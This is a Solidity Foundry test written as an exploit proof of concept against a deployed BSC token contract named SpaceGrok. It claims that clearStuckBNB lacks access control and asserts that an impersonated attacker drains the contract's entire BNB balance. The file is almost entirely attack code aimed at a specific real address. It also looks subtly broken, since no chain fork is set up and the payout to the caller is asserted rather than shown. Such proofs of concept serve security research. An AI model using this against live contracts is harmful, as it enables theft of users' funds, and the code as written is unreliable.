```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

// Minimal interface for SpaceGrok based on ABI summary and source
interface ISpaceGrok {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function clearStuckBNB() external;
    function updateBuyFees(uint256 _marketingFee, uint256 _devFee) external;
    function updateSellFees(uint256 _marketingFee, uint256 _devFee) external;
    function updateSwapTokensAtAmount(uint256 newAmount) external returns (bool);
    function manualSwap(uint256 amount) external;
    // other functions omitted for brevity
}

contract ExploitTest is Test {
    // Deployed address of SpaceGrok on BSC
    address constant SPACE_GROK = 0x58718fd4567517d9a713a1f9f3de6cbf9404e59e;
    ISpaceGrok public target;

    address attacker = address(0xdeadbeef);

    function setUp() public {
        target = ISpaceGrok(SPACE_GROK);

        // Label for debugging
        vm.label(SPACE_GROK, "SpaceGrok");
        vm.label(attacker, "Attacker");

        // Give the contract some BNB so clearStuckBNB has something to drain
        deal(SPACE_GROK, 10 ether);
    }

    function testEmptyInputAuth() public {
        // Ensure the contract has BNB
        assertGt(address(SPACE_GROK).balance, 0, "Contract should have BNB for the exploit");

        // Record attacker's initial BNB balance
        uint256 attackerStartBalance = attacker.balance;

        // Attacker calls clearStuckBNB – no check on caller identity
        vm.prank(attacker);
        target.clearStuckBNB();

        // After the call, the entire contract BNB should be sent to the attacker
        uint256 attackerEndBalance = attacker.balance;
        assertEq(address(SPACE_GROK).balance, 0, "Contract should have no BNB left");
        assertEq(attackerEndBalance - attackerStartBalance, 10 ether, "Attacker should receive all contract BNB");
    }
}
```
